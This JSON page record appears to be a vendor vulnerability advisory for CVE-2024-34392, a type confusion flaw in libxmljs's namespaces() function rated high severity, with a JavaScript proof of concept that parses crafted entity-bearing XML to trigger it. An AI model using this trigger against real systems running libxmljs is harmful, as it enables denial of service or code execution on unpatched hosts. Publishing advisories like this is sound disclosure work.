{"hash":"ef174cece051217e775af9c40c29fbee30ff32ac","data":{"post":{"title":"libxmljs namespaces type confusion RCE","path":"/vulnerabilities/libxmljs-namespaces-type-confusion-rce-jfsa-2024-001034096/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>libxmljs namespaces type confusion RCE</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>libxmljs</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the namespaces() function (which invokes _wrap__xmlNode_nsDef_get()) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-js\">const libxmljs = require('libxmljs');\n\nvar d = `&#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&#x3C;!DOCTYPE note\n[\n&#x3C;!ENTITY writer PUBLIC \"` + \"A\".repeat(8) + \"B\".repeat(8) + \"C\".repeat(8) + \"D\".repeat(8) + \"P\".repeat(8) + `\" \"JFrog Security\">\n]>\n&#x3C;from>&#x26;writer;&#x3C;/from>\n`;\n\nt = libxmljs.parseXml(d)\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0] //entity_decl\nn = c2.namespaces(true) //onlyLocal = true\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/libxmljs/libxmljs/issues/646\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Original Advisory</a></p>\n","description":"CVE-2024-34392, HIGH, libxmljs namespaces type confusion RCE","date_published":"2024-05-02","xray_id":"JFSA-2024-001034096","vul_id":"CVE-2024-34392","severity":"high","discovered_by":"Uriya Yavnieli","last_updated":"2024-05-02","cvss":8.1}},"context":{}}